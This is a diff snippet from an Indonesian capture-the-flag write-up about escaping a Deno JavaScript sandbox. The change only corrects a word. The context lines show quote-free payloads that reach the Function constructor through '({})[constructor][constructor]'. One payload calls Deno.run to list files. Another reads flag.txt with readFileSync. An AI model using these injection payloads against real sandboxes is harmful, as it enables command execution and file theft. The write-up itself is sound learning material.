@@ -29,7 +29,7 @@ Dalam tantangan ini, kita tidak bisa menggunakan "" dan '', jadi kita menggantin
 ({})[constructor][constructor](this[\`De\` + \`no\`][\`run\`]({cmd: [\`ls\`]}) )()
 ```
 
-code di atask ternyata tidak berhasil, karena saya yakin ini harus berhasil. Saya mencoba kode di deno1 dan berhasil. Hmmm kemudian saya cek file dockernya ternyata deno.run tidak boleh, jadi saya ganti dengan membaca langsung filenya seperti yang saya tulis di deno1 yaitu dengan deno.readfilesync(). kodenya akan seperti ini:
+code di atask ternyata tidak berhasil, karena saya yakin ini seharus berhasil. Saya mencoba kode di deno1 dan berhasil. Hmmm kemudian saya cek file dockernya ternyata deno.run tidak boleh, jadi saya ganti dengan membaca langsung filenya seperti yang saya tulis di deno1 yaitu dengan deno.readfilesync(). kodenya akan seperti ini:
 
 ```jsx
 ({})[`constructor`][`constructor`](`decoder = new TextDecoder(\`utf-8\`);data = this[\`De\`+\`no\`][\`readFileSync\`](\`flag\x2etxt\`);return decoder[\`decode\`](data);`)()
